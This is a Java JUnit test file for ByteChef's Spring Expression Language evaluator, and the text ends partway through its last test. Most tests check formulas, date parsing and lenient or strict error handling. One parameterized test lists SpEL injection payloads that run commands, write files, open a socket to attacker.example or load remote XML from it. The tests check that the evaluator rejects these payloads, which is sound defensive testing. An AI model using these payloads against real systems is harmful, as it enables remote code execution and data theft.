/*
 * Copyright 2016-2020 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * Modifications copyright (C) 2025 ByteChef
 */

package com.bytechef.evaluator;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertInstanceOf;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrowsExactly;
import static org.junit.jupiter.api.Assertions.assertTrue;

import com.bytechef.commons.util.MapUtils;
import com.bytechef.test.extension.ObjectMapperSetupExtension;
import java.text.SimpleDateFormat;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

/**
 * @author Arik Cohen
 */
@ExtendWith(ObjectMapperSetupExtension.class)
class SpelEvaluatorTest {

    private static final Evaluator EVALUATOR = SpelEvaluator.create();

    @Test
    void test1() {
        Map<String, Object> map = EVALUATOR.evaluate(Map.of("type", "hello"), Collections.emptyMap());

        assertEquals(map, Map.of("type", "hello"));
    }

    @Test
    void test2() {
        Map<String, Object> map = EVALUATOR.evaluate(Map.of("type", "type", "hello", "world"), Collections.emptyMap());

        assertEquals(map, Map.of("type", "type", "hello", "world"));
    }

    @Test
    void test3() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "hello", "${name}"), Collections.singletonMap("name", "arik"));

        assertEquals("arik", MapUtils.getString(map, "hello"));
    }

    @Test
    void test4() {
        Map<String, Object> context = new HashMap<>();

        context.put("firstName", "Arik");
        context.put("lastName", "Cohen");

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "hello", "${firstName} ${lastName}"), context);

        assertEquals("Arik Cohen", MapUtils.getString(map, "hello"));
    }

    @Test
    void test5() {
        Map<String, Object> context = new HashMap<>();

        context.put("number", "5");

        assertThrowsExactly(ExpressionEvaluationException.class, () -> EVALUATOR.evaluate(
            Map.of("type", "type", "hello", "=T(java.lang.Integer).valueOf(number)"), context));
    }

    @Test
    void testLenientModeReturnsOriginalValueForInvalidFormula() {
        Map<String, Object> context = new HashMap<>();

        context.put("number", "5");

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "hello", "=T(java.lang.Integer).valueOf(number)"), context, true);

        assertEquals("=T(java.lang.Integer).valueOf(number)", MapUtils.get(map, "hello"));
    }

    @Test
    void test6() {
        Map<String, Object> context = new HashMap<>();
        context.put("firstName", "Arik");
        context.put("lastName", "Cohen");

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "list", Arrays.asList("${firstName}", "${lastName}")), context);

        assertEquals(Arrays.asList("Arik", "Cohen"), MapUtils.getList(map, "list", String.class));
    }

    @Test
    void test7() {
        Map<String, Object> context = new HashMap<>();

        context.put("firstName", "Arik");
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "map", Collections.singletonMap("hello", "${firstName}")), context);

        assertEquals(Collections.singletonMap("hello", "Arik"), MapUtils.getMap(map, "map"));
    }

    @Test
    void test8() {
        Map<String, Object> context = new HashMap<>();

        context.put("n1", 5);
        context.put("n2", 3);

        Map<String, Object> map = EVALUATOR.evaluate(Map.of("type", "type", "mult", "=n1*n2"), context);

        assertEquals(Integer.valueOf(15), MapUtils.getInteger(map, "mult"));
    }

    @Test
    void test9() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "message", "${name}"), Collections.emptyMap());

        assertEquals("${name}", MapUtils.getString(map, "message"));
    }

    @Test
    void test10() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "message", "yo ${name}"), Collections.emptyMap());

        assertEquals("yo ${name}", MapUtils.getString(map, "message"));
    }

    @Test
    void test11() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "thing", "${number}"), Collections.singletonMap("number", 1));

        assertEquals(1, MapUtils.get(map, "thing"));
    }

    @Test
    void test12() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "thing", "=number*3"), Collections.singletonMap("number", 1));

        assertEquals(3, MapUtils.get(map, "thing"));
    }

    @Test
    void test13() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "thing", "=number*3"), Collections.emptyMap(), true);

        assertEquals("=number*3", MapUtils.get(map, "thing"));
    }

    @Test
    void test14() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "list", "=range(1,3)"), Collections.emptyMap());

        assertEquals(Arrays.asList(1, 2, 3), MapUtils.get(map, "list"));
    }

    @Test
    void test15() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "sub", Collections.singletonMap("list", "=range(1,3)")), Collections.emptyMap());

        Map<String, ?> sub = MapUtils.getRequiredMap(map, "sub");

        assertEquals(Arrays.asList(1, 2, 3), sub.get("list"));
    }

    @Test
    void test16() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "message", "${item1}-${item2}"), Map.of("item1", "hello", "item2", "world"));

        assertEquals("hello-world", MapUtils.get(map, "message"));
    }

    @Test
    void test17() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "someBoolean", "=boolean('1')"), Collections.emptyMap());

        assertEquals(Boolean.TRUE, MapUtils.get(map, "someBoolean"));
    }

    @Test
    void test18() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "someByte", "=byte('127')"), Collections.emptyMap());

        assertEquals(Byte.MAX_VALUE, MapUtils.get(map, "someByte"));
    }

    @Test
    void test19() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "someChar", "=char('c')"), Collections.emptyMap());

        assertEquals('c', MapUtils.get(map, "someChar"));
    }

    @Test
    void test20() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "someShort", "=short('32767')"), Collections.emptyMap());

        assertEquals(Short.MAX_VALUE, MapUtils.get(map, "someShort"));
    }

    @Test
    void test21() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "someInt", "=int('1')"), Collections.emptyMap());

        assertEquals(1, MapUtils.get(map, "someInt"));
    }

    @Test
    void test22() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "someLong", "=long('1')"), Collections.emptyMap());

        assertEquals(1L, MapUtils.get(map, "someLong"));
    }

    @Test
    void test23() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "someFloat", "=float('1.337')"), Collections.emptyMap());

        assertEquals(1.337f, MapUtils.get(map, "someFloat"));
    }

    @Test
    void test24() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "someDouble", "=double('1.337')"), Collections.emptyMap());

        assertEquals(1.337d, MapUtils.get(map, "someDouble"));
    }

    @Test
    void test25() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "joined", "=join(',',range(1,3))"), Collections.emptyMap());

        assertEquals("1,2,3", MapUtils.get(map, "joined"));
    }

    @Test
    void test26() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "joined", "=join(',',range(1,1))"), Collections.emptyMap());

        assertEquals("1", MapUtils.get(map, "joined"));
    }

    @Test
    void test27() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "joined", "=join(' and ',{'a','b','c'})"), Collections.emptyMap());

        assertEquals("a and b and c", MapUtils.get(map, "joined"));
    }

    @Test
    void test28() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "concatenated", "=concat({'a','b','c'}, {'d','e','f'})"), Collections.emptyMap());

        assertEquals(Arrays.asList("a", "b", "c", "d", "e", "f"), MapUtils.get(map, "concatenated"));
    }

    @Test
    void test29() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "concatenated", "=concat({'a','b','c'}, range(1,3))"), Collections.emptyMap());

        assertEquals(Arrays.asList("a", "b", "c", 1, 2, 3), MapUtils.get(map, "concatenated"));
    }

    @Test
    void test30() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "flattened", "=flatten({{'a','b','c'},{'d','e','f'}})"), Collections.emptyMap());

        assertEquals(Arrays.asList("a", "b", "c", "d", "e", "f"), MapUtils.get(map, "flattened"));
    }

    @Test
    void test31() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "flattened", "=flatten({{'a','b','c'},range(1,3)})"), Collections.emptyMap());

        assertEquals(Arrays.asList("a", "b", "c", 1, 2, 3), MapUtils.get(map, "flattened"));
    }

    @Test
    void test33() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "uuid", "=uuid()"), Collections.emptyMap());

        assertNotNull(MapUtils.get(map, "uuid"));
    }

    @Test
    void test34() {
        Map<String, Object> context = new HashMap<>();

        context.put("firstName", "Arik");

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "fullName", "${firstName} ${lastName}"), context);

        assertEquals("Arik ${lastName}", MapUtils.getString(map, "fullName"));
    }

    @Test
    void test35() {
        Map<String, Object> context = new HashMap<>();

        context.put("num", 5.0);
        context.put("den", 10.0);

        Map<String, Object> map = EVALUATOR.evaluate(Map.of("type", "type", "result", "=num/den"), context);

        assertEquals(0.5d, MapUtils.getDouble(map, "result"));
    }

    @Test
    void test38() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "sorted", "=sort({3,1,2})"), Collections.emptyMap());

        assertEquals(Arrays.asList(1, 2, 3), MapUtils.getList(map, "sorted", Integer.class));
    }

    @Test
    void test39() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "sorted", "=sort({'C','A','B'})"), Collections.emptyMap());

        assertEquals(Arrays.asList("A", "B", "C"), MapUtils.getList(map, "sorted", String.class));
    }

    @Test
    void test40() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "date", "=format(now(),'yyyyMMdd')"), Collections.emptyMap());

        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");

        assertEquals(sdf.format(new Date()), MapUtils.getString(map, "date"));
    }

    @Test
    void test41() {
        LocalDateTime localDateTime = LocalDateTime.now();

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("date", "${localDateTime}"), Map.of("localDateTime", localDateTime));

        assertEquals(localDateTime, MapUtils.getLocalDateTime(map, "date"));

        map = EVALUATOR.evaluate(
            Map.of("date", "=minusDays(localDateTime, 1)"), Map.of("localDateTime", localDateTime));

        assertEquals(localDateTime.minusDays(1), MapUtils.getLocalDateTime(map, "date"));

        map = EVALUATOR.evaluate(
            Map.of("date", "=minusDays(${localDateTime}, 1)"), Map.of("localDateTime", localDateTime));

        assertEquals(localDateTime.minusDays(1), MapUtils.getLocalDateTime(map, "date"));

        map = EVALUATOR.evaluate(Map.of("hour", "=${localDateTime}.hour"), Map.of("localDateTime", localDateTime));

        assertEquals(localDateTime.getHour(), MapUtils.getInteger(map, "hour"));
    }

    @Test
    void test42() {
        LocalDateTime localDateTime = LocalDateTime.now();

        assertThrowsExactly(ExpressionEvaluationException.class, () -> EVALUATOR.evaluate(
            Map.of("hour", "=${localDateTime}.getHour()"), Map.of("localDateTime", localDateTime)));

        assertThrowsExactly(ExpressionEvaluationException.class, () -> EVALUATOR.evaluate(
            Map.of("hour", "=${localDateTime.getHour()}"), Map.of("localDateTime", localDateTime)));

        assertThrowsExactly(ExpressionEvaluationException.class, () -> EVALUATOR.evaluate(
            Map.of("hour", "${localDateTime.getHour()}"), Map.of("localDateTime", localDateTime)));
    }

    @Test
    void testLenientModeReturnsOriginalValueForMethodCallFormula() {
        LocalDateTime localDateTime = LocalDateTime.now();

        Map<String, Object> map1 = EVALUATOR.evaluate(
            Map.of("hour", "=${localDateTime}.getHour()"), Map.of("localDateTime", localDateTime), true);

        assertEquals("=${localDateTime}.getHour()", MapUtils.get(map1, "hour"));

        Map<String, Object> map2 = EVALUATOR.evaluate(
            Map.of("hour", "=${localDateTime.getHour()}"), Map.of("localDateTime", localDateTime), true);

        assertEquals("=${localDateTime.getHour()}", MapUtils.get(map2, "hour"));
    }

    @Test
    void test43() {
        Map<String, Object> map = EVALUATOR.evaluate(Map.of("size", "=size(${list})"), Map.of("list", List.of(1, 2)));

        assertEquals(2, MapUtils.getInteger(map, "size"));
    }

    @Test
    void test44() {
        Map<String, Object> testMap = new HashMap<>();

        testMap.put("list", null);

        Map<String, Object> map = EVALUATOR.evaluate(Map.of("size", "=size(${list})"), testMap);

        assertEquals(-1, MapUtils.getInteger(map, "size"));
    }

    @Test
    void test45() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("equalsIgnoreCase", "=equalsIgnoreCase(${str1}, ${str2})"),
            Map.of("str1", "test", "str2", "Test"));

        assertTrue(MapUtils.getBoolean(map, "equalsIgnoreCase"));
    }

    @Test
    void test46() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("equalsIgnoreCase", "=equalsIgnoreCase(${str1}, ${str2})"),
            Map.of("str1", "test", "str2", "abc"));

        assertFalse(MapUtils.getBoolean(map, "equalsIgnoreCase"));
    }

    @Test
    void test47() {
        Map<String, Object> testMap = new HashMap<>();

        testMap.put("str1", null);
        testMap.put("str2", "abc");

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("equalsIgnoreCase", "=equalsIgnoreCase(${str1}, ${str2})"), testMap);

        assertFalse(MapUtils.getBoolean(map, "equalsIgnoreCase"));
    }

    @Test
    void test48() {
        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(
                Map.of("equalsIgnoreCase", "=equalsIgnoreCase(${str1}, ${str2})"),
                Map.of("str1", 6, "str2", "abc")));

        assertEquals("Invalid arguments for equalsIgnoreCase.", expressionEvaluationException.getMessage());
    }

    @Test
    void testConcatJoinsAllStringArguments() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of(
                "fullName", "=concat(${firstName}, ' ', ${lastName})",
                "letters", "=concat('a', 'b', 'c', 'd')"),
            Map.of("firstName", "John", "lastName", "Doe"));

        assertEquals("John Doe", MapUtils.get(map, "fullName"));
        assertEquals("abcd", MapUtils.get(map, "letters"));
    }

    @Test
    void testConcatJoinsAllListArguments() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("concatenated", "=concat(${list1}, ${list2}, ${list3})"),
            Map.of("list1", List.of("a", "b"), "list2", List.of(), "list3", List.of(1, 2)));

        assertEquals(List.of("a", "b", 1, 2), MapUtils.get(map, "concatenated"));
    }

    @Test
    void testConcatReturnsSingleArgumentUnchanged() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("string", "=concat('abc')", "list", "=concat({'a','b'})"), Collections.emptyMap());

        assertEquals("abc", MapUtils.get(map, "string"));
        assertEquals(List.of("a", "b"), MapUtils.get(map, "list"));
    }

    @Test
    void testConcatConvertsNonStringValuesToText() {
        Map<String, Object> variables = new HashMap<>();

        variables.put("id", 42);
        variables.put("missing", null);

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of(
                "order", "=concat('Order #', ${id})",
                "numbers", "=concat(1, 2.5, true)",
                "withNull", "=concat('a', ${missing}, 'b')"),
            variables);

        assertEquals("Order #42", MapUtils.get(map, "order"));
        assertEquals("12.5true", MapUtils.get(map, "numbers"));
        assertEquals("ab", MapUtils.get(map, "withNull"));
    }

    @Test
    void testConcatRejectsMaps() {
        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(
                Map.of("concatenated", "=concat('a', ${map})"), Map.of("map", Map.of("key", "value"))));

        assertEquals(
            "Invalid arguments for concat. Expected all arguments to be lists, or none of them to be a list or a map.",
            expressionEvaluationException.getMessage());
    }

    @Test
    void testConcatRejectsMixedStringsAndLists() {
        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(
                Map.of("concatenated", "=concat('a', 'b', {'c'})"), Collections.emptyMap()));

        assertEquals(
            "Invalid arguments for concat. Expected all arguments to be lists, or none of them to be a list or a map.",
            expressionEvaluationException.getMessage());
    }

    @Test
    void testConcatRejectsNoArguments() {
        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("concatenated", "=concat()"), Collections.emptyMap()));

        assertEquals(
            "Invalid number of arguments for concat. Expected at least 1, got 0",
            expressionEvaluationException.getMessage());
    }

    @Test
    void testIncompleteFormulaThrowsInStrictMode() {
        assertThrowsExactly(ExpressionEvaluationException.class, () -> EVALUATOR.evaluate(
            Map.of("type", "type", "value", "=222+"), Collections.emptyMap()));
    }

    @Test
    void testIncompleteFormulaReturnsOriginalValueInLenientMode() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "value", "=222+"), Collections.emptyMap(), true);

        assertEquals("=222+", MapUtils.get(map, "value"));
    }

    @Test
    void testIncompleteFormulaWithAccessorReturnsOriginalValueInLenientMode() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "value", "=n1+"), Map.of("n1", 5), true);

        assertEquals("=n1+", MapUtils.get(map, "value"));
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "=split()", "=split('a,b')", "=substring()", "=join(',')", "=split(1, ',')"
    })
    void testFunctionWithInvalidArgumentsReturnsOriginalValueInLenientMode(String formula) {
        Map<String, Object> map = EVALUATOR.evaluate(Map.of("value", formula), Collections.emptyMap(), true);

        assertEquals(formula, MapUtils.get(map, "value"));
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "=split()", "=split('a,b')", "=substring()", "=join(',')", "=split(1, ',')"
    })
    void testFunctionWithInvalidArgumentsThrowsInStrictMode(String formula) {
        assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", formula), Collections.emptyMap()));
    }

    @Test
    void testFormulaWithTrailingOperatorReturnsOriginalValueInLenientMode() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("type", "type", "value", "=10*3-"), Collections.emptyMap(), true);

        assertEquals("=10*3-", MapUtils.get(map, "value"));
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "=T (java.lang.Runtime).getRuntime ().exec ('calc')",
        "=T\t(java.lang.Integer).valueOf(number)",
        "=T (java.lang.System).out",
        "=T (java.lang.System).getProperty ('user.home')",
        "=${localDateTime} .getHour ()",
        "=new org.springframework.context.support.ClassPathXmlApplicationContext('https://attacker.example/evil.xml')",
        "=new org.springframework.context.support.ClassPathXmlApplicationContext ('https://attacker.example/evil.xml')",
        "=new ProcessBuilder('calc')",
        "=new ProcessBuilder({'sh','-c','id'}) .start ()",
        "=new java.io.FileOutputStream('/tmp/pwned')",
        "=new java.net.Socket('attacker.example', 1337)",
        "=new\tProcessBuilder('calc')",
        "=(new ProcessBuilder('calc'))",
        "=new java.lang.String('x') + new java.lang.String('y')",
        "={1,2,3}.![T (java.lang.System)]",
        "={1,2,3}.?[#this > T (java.lang.Integer).parseInt ('1')]"
    })
    void testShouldRejectSpelInjectionPayloads(String payload) {
        assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", payload), Collections.emptyMap()),
            payload);
    }

    @Test
    void testBeanReferenceIsRejectedAtRuntime() {
        assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", "=@dangerousService"), Collections.emptyMap()));
    }

    @Test
    void testCreateEvaluationContextBlocksConstructorInvocations() {
        SpelEvaluator evaluator = (SpelEvaluator) SpelEvaluator.create();
        StandardEvaluationContext context = evaluator.createEvaluationContext(Collections.emptyMap(), true);
        SpelExpressionParser parser = new SpelExpressionParser();

        assertThrowsExactly(
            SpelEvaluationException.class,
            () -> parser.parseExpression("new java.lang.String('hello')")
                .getValue(context));
        assertThrowsExactly(
            SpelEvaluationException.class,
            () -> parser.parseExpression("new ProcessBuilder('calc')")
                .getValue(context));
        assertThrowsExactly(
            SpelEvaluationException.class,
            () -> parser.parseExpression(
                "new org.springframework.context.support.ClassPathXmlApplicationContext('https://x/evil.xml')")
                .getValue(context));
    }

    @Test
    void testCreateEvaluationContextBlocksTypeReferences() {
        SpelEvaluator evaluator = (SpelEvaluator) SpelEvaluator.create();
        StandardEvaluationContext context = evaluator.createEvaluationContext(Collections.emptyMap(), true);
        SpelExpressionParser parser = new SpelExpressionParser();

        assertThrowsExactly(
            SpelEvaluationException.class,
            () -> parser.parseExpression("T(java.lang.System)")
                .getValue(context));
        assertThrowsExactly(
            SpelEvaluationException.class,
            () -> parser.parseExpression("T(java.lang.Runtime).getRuntime()")
                .getValue(context));
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "=concat({'brand new '}, {' product'})",
        "=join(',', {'new item', 'old item'})",
        "='new year 2024'",
        "='brand new'"
    })
    void testShouldAcceptFormulasWithReservedTokensInsideStringLiterals(String formula) {
        assertDoesNotThrow(
            () -> EVALUATOR.evaluate(Map.of("value", formula), Collections.emptyMap()),
            formula);
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "newCustomer",
        "newOrder.amount",
        "newItems[0]",
        "Tx",
        "T_count",
        "T1.value"
    })
    void testShouldAcceptIdentifiersResemblingReservedKeywords(String accessor) {
        Map<String, Object> contextMap = new HashMap<>();

        contextMap.put("newCustomer", "Alice");
        contextMap.put("newOrder", Map.of("amount", 42));
        contextMap.put("newItems", List.of("first"));
        contextMap.put("Tx", "tx-value");
        contextMap.put("T_count", 7);
        contextMap.put("T1", Map.of("value", "ok"));

        assertDoesNotThrow(
            () -> EVALUATOR.evaluate(Map.of("value", "${" + accessor + "}"), contextMap),
            accessor);
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "abc",
        "_abc",
        "user.name",
        "user.address.street",
        "items[0]",
        "items[10].name",
        "user['first name']",
        "user['ключ']",
        "foo.[0]",
        "foo.['bar-baz']"
    })
    void testShouldAcceptValidAccessors(String accessor) {
        assertDoesNotThrow(
            () -> EVALUATOR.evaluate(Map.of("key", "${" + accessor + "}"), Collections.emptyMap()),
            accessor);
    }

    @ParameterizedTest
    @ValueSource(strings = {
        " ",
        "T(java.lang.System)",
        "user..name",
        ".user",
        "user.",
        "user[abc]",
        "user['unclosed]",
        "user[1a]",
        "user['x']y",
        "1abc",
        "user.1name"
    })
    void testShouldRejectInvalidAccessors(String accessor) {
        assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("key", "${" + accessor + "}"), Collections.emptyMap()),
            accessor);
    }

    @Test
    void testEvaluationFailureThrowsInStrictMode() {
        String formula = "=${startDate} > parseDate('2026-08-24T22:00:00Z', \"yyyy-MM-dd'T'HH:mm:ssX\")";

        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", formula), Map.of("startDate", "2026-08-26T00:00:00.000Z")));

        assertTrue(expressionEvaluationException.getMessage()
            .contains("Cannot compare instances of class java.lang.String and class java.time.ZonedDateTime"));
        assertNotNull(expressionEvaluationException.getCause());
    }

    @Test
    void testEvaluationFailureReturnsOriginalValueInLenientMode() {
        String formula = "=${startDate} > parseDate('2026-08-24T22:00:00Z', \"yyyy-MM-dd'T'HH:mm:ssX\")";

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", formula), Map.of("startDate", "2026-08-26T00:00:00.000Z"), true);

        assertEquals(formula, MapUtils.get(map, "value"));
    }

    @Test
    void testParseDateAcceptsAnAlreadyTemporalArgument() {
        Map<String, Object> context = Map.of("dbDate", java.time.ZonedDateTime.parse("2026-08-26T00:00:00Z"));

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "=parseDate(${dbDate}, \"yyyy-MM-dd'T'HH:mm:ss.SSSX\")"), context);

        assertEquals(java.time.ZonedDateTime.parse("2026-08-26T00:00:00Z"), MapUtils.get(map, "value"));
    }

    @Test
    void testParseDateStillAcceptsAString() {
        Map<String, Object> context = Map.of("dbDate", "2026-08-26T00:00:00.000Z");

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "=parseDate(${dbDate}, \"yyyy-MM-dd'T'HH:mm:ss.SSSX\")"), context);

        assertEquals(java.time.ZonedDateTime.parse("2026-08-26T00:00:00Z"), MapUtils.get(map, "value"));
    }

    @Test
    void testParseDateTimeAcceptsAnAlreadyTemporalArgument() {
        Map<String, Object> context = Map.of("dbDate", java.time.ZonedDateTime.parse("2026-08-26T00:00:00Z"));

        Map<String, Object> map = EVALUATOR.evaluate(Map.of("value", "=parseDateTime(${dbDate})"), context);

        assertEquals(LocalDateTime.of(2026, 8, 26, 0, 0), MapUtils.get(map, "value"));
    }

    @Test
    void testParseDateRejectsALocalTimeArgument() {
        Map<String, Object> context = Map.of("dbTime", java.time.LocalTime.of(10, 15, 30));

        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", "=parseDate(${dbTime})"), context));

        assertTrue(expressionEvaluationException.getMessage()
            .contains("parseDate"));
        assertTrue(expressionEvaluationException.getMessage()
            .contains("10:15:30"));
    }

    @Test
    void testParseDateTimeRejectsALocalTimeArgument() {
        Map<String, Object> context = Map.of("dbTime", java.time.LocalTime.of(10, 15, 30));

        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", "=parseDateTime(${dbTime})"), context));

        assertTrue(expressionEvaluationException.getMessage()
            .contains("parseDateTime"));
    }

    @Test
    void testParseDateRejectsANonTemporalNonStringArgument() {
        Map<String, Object> context = Map.of("dbValue", 123);

        assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", "=parseDate(${dbValue})"), context));
    }

    @Test
    void testAccessorEvaluationFailureReturnsOriginalExpression() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "${items[5]}"), Map.of("items", List.of(1, 2, 3)));

        assertEquals("${items[5]}", MapUtils.get(map, "value"));
    }

    @Test
    void testFormulaEvaluationFailureStillThrowsForTheSameFailure() {
        assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", "=${items[5]} > 1"), Map.of("items", List.of(1, 2, 3))));
    }

    @Test
    void testParseDateRejectionReturnsOriginalValueInLenientMode() {
        Map<String, Object> context = Map.of("dbTime", java.time.LocalTime.of(10, 15, 30));

        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "=parseDate(${dbTime})"), context, true);

        assertEquals("=parseDate(${dbTime})", MapUtils.get(map, "value"));
    }

    @Test
    void testParseDateUnparseableTextReturnsOriginalValueInLenientMode() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "=parseDate('not-a-date')"), Collections.emptyMap(), true);

        assertEquals("=parseDate('not-a-date')", MapUtils.get(map, "value"));
    }

    @Test
    void testParseDateUnparseableTextThrowsInStrictMode() {
        ExpressionEvaluationException expressionEvaluationException = assertThrowsExactly(
            ExpressionEvaluationException.class,
            () -> EVALUATOR.evaluate(Map.of("value", "=parseDate('not-a-date')"), Collections.emptyMap()));

        assertTrue(expressionEvaluationException.getMessage()
            .contains("parseDate"), expressionEvaluationException.getMessage());
    }

    @Test
    void testParseDateReturnTypeFollowsTheArgumentPrecision() {
        assertInstanceOf(
            LocalDate.class,
            MapUtils.get(EVALUATOR.evaluate(Map.of("value", "=parseDate(${a})"), Map.of("a", "2026-08-26")), "value"));
        assertInstanceOf(
            LocalDate.class,
            MapUtils.get(
                EVALUATOR.evaluate(Map.of("value", "=parseDate(${a})"), Map.of("a", LocalDate.of(2026, 8, 26))),
                "value"));
        assertInstanceOf(
            java.time.ZonedDateTime.class,
            MapUtils.get(
                EVALUATOR.evaluate(
                    Map.of("value", "=parseDate(${a})"),
                    Map.of("a", java.time.ZonedDateTime.parse("2026-08-26T00:00:00Z"))),
                "value"));
        assertInstanceOf(
            java.time.ZonedDateTime.class,
            MapUtils.get(
                EVALUATOR.evaluate(
                    Map.of("value", "=parseDate(${a})"), Map.of("a", LocalDateTime.of(2026, 8, 26, 0, 0))),
                "value"));
    }

    @Test
    void testParseDateWithNoArgumentsReturnsOriginalValueInLenientMode() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "=parseDate()"), Collections.emptyMap(), true);

        assertEquals("=parseDate()", MapUtils.get(map, "value"));
    }

    @Test
    void testParseDateTimeWithNoArgumentsReturnsOriginalValueInLenientMode() {
        Map<String, Object> map = EVALUATOR.evaluate(
            Map.of("value", "=parseDateTime()"), Collections.emptyMap(), true);

        assertEquals("=parseDateTime()", MapUtils.get(map, "value"));
